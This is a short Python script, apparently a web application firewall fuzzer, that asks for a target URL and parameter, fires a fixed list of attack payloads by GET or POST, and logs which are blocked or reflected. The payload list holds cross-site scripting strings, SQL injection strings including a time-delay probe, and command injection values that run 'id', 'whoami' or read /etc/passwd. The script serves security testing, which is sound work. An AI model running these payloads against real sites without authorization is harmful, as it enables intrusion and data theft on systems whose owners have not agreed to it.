import requests
import threading
from datetime import datetime

results = []

waf_payloads = [
    "<sCript>alert(1)</sCript>",
    "1' OR '1'='1",
    "admin'--",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "' OR 1=1--",
    "`cat /etc/passwd`",
    "$(id)",
    "admin\\' --",
    "‘ OR ‘1’=’1",
    "|| whoami",
    "' OR sleep(5)--",
    "<img src=x onerror=confirm(1)>"
]

def fuzz_waf(url, param, method):
    for payload in waf_payloads:
        data = {param: payload}
        try:
            if method.upper() == "GET":
                resp = requests.get(url, params=data, timeout=10)
            else:
                resp = requests.post(url, data=data, timeout=10)

            blocked = resp.status_code in [403, 406]
            reflected = payload in resp.text
            anomaly = len(resp.text) < 100

            results.append({
                "url": url,
                "method": method,
                "param": param,
                "payload": payload,
                "blocked": blocked,
                "reflected": reflected,
                "anomaly": anomaly,
                "status": resp.status_code,
                "timestamp": datetime.utcnow().isoformat()
            })

        except Exception as e:
            results.append({
                "url": url,
                "method": method,
                "param": param,
                "payload": payload,
                "error": str(e),
                "timestamp": datetime.utcnow().isoformat()
            })

def run_waf_fuzzer():
    print("\n--- WAF Fuzzer ---")
    url = input("Target URL: ").strip()
    param = input("Parameter to fuzz: ").strip()
    method = input("HTTP method [GET/POST]: ").strip().upper()

    print(f"\n[*] Starting WAF fuzzing on {url} using parameter: {param}\n")

    t = threading.Thread(target=fuzz_waf, args=(url, param, method))
    t.start()
    t.join()

    with open("waf_fuzzer_results.txt", "w") as f:
        for r in results:
            f.write(str(r) + "\n")

    print("[+] WAF fuzzing complete. Results saved to waf_fuzzer_results.txt.")

